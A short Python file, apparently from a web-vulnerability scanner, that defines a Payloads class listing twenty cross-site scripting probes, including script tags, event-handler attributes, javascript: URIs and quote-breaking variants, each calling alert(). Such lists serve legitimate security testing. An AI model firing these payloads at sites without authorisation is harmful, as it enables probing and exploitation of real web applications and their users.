class Payloads:

    PAYLOADS = [

        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "<iframe src=javascript:alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<img src=1 onerror=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<input autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<select autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<math href='javascript:alert(1)'>CLICK</math>"

    ]